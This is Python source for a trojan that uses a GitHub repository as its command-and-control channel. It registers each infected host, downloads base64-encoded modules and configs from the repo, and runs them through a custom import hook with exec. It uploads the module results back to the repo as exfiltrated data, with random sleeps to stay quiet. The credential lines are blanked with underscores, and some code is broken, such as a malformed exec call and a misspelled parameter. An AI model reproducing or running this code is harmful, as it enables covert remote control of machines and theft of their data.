import json
import base64
import sys
import time
import imp
import random
import threading
import queue as Queue
import os
import time
import _____
from github3 import login


"""
	TODO:
        - optimize away the apply config
"""


task_queue = Queue.Queue()

class HubHandler:
    """ 
        Class for handling GitHub connections
          fetching modules, saving data,
          loading configs
    """

    def __init__(self):
        self.trojan_id = str(time.time()).replace('.','_')
        self.registered = False
        
        self.trojan_config = "config/%s.json" % self.trojan_id
        self.data_path = "data/%s/" % self.trojan_id
        self.trojan_modules = []
        self.configured = False

        self.ghandle, self.repo, self.branch = self.connect()

    def connect(self):
        " Connect to github and get the repository "
        gh = _____.______________(login)
        self.username = gh.me().login
        repo = gh.repository(self.username,"codename-seniorita")
        branch = repo.branch("master")
        return gh, repo, branch


    def get_file(self, filepath):
        tree = self.branch.commit.commit.tree.to_tree().recurse()

        for filename in tree.tree:
            if filepath in filename.path:
                print("[*] Found file %s" % filepath)
                blob = self.repo.blob(filename._json_data['sha'])
                return blob.content
        return None

    def apply_config(self):
       config_json = None
       if not self.registered:
            config_json = self.get_file("config/default.json")
            self.repo.create_file(self.trojan_config,
                   "registering %s" % self.trojan_id,
                   # fix this:
                   base64.b64encode(config_json))
            self.registered = True
       else:
           config_json = self.get_file(self.trojan_config)
       config = json.loads(base64.b64decode(config_json))
       self.configured = True
       for task in config:
           if task['module'] not in sys.modules:
               exec("import %s" % task['module'])
       return config

    def store_module_result(self, data):
        remote_path = "data/%s/%d.data" % (self.trojan_id, random.randint(1000, 100000))
        self.repo.create_file(remote_path, "commit message", base64.b64encode(data))

class GitImporter:
    " Load module from GitHub "

    def __init__(self, ghandle):
        self.current_module_code = ""
        self.ghandle = ghandle

    def find_module(self, fullname, path=None):
        if ghandle.configured:
            print("[*] Attempting to retreive %s" % fullname)
            new_library = ghandle.get_file("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code in module.__dict__)
        sys.modules[name] = module
        return module

def module_runner(module, ghanlde, queue=task_queue):
    queue.put(1)
    result = sys.modules[module].run()
    queue.get()
    ghandle.store_module_result(result)


ghandle = HubHandler() 
sys.meta_path = [GitImporter(ghandle)]

while True:
    if task_queue.empty():
        config = ghandle.apply_config()
    for task in config:
        t = threading.Thread(target=module_runner, args=(task['module'], ghandle, task_queue))
        t.start()
        time.sleep(random.randint(1,10))
    time.sleep(random.randint(1000, 100000))
